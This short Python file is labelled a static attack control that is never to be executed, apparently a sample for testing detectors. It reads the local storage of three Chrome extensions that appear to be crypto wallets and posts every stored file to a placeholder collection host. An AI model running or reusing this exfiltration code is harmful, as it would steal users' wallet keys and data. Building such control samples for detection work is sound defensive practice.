# Static attack control. Never execute.
import pathlib
import shutil
import requests

extension_ids = [
    'nkbihfbeogaeaoehlefnkodbefgpgknn',
    'bfnaelmomeimhlpmgjnjophhpkkoljpa',
    'egjidjbpglichdcondbcbdnbeeppgdph',
]
for extension_id in extension_ids:
    source = pathlib.Path.home() / '.config/google-chrome/Default/Local Extension Settings' / extension_id
    for store in source.glob('*'):
        requests.post('https://example.invalid/collect', data=store.read_bytes())
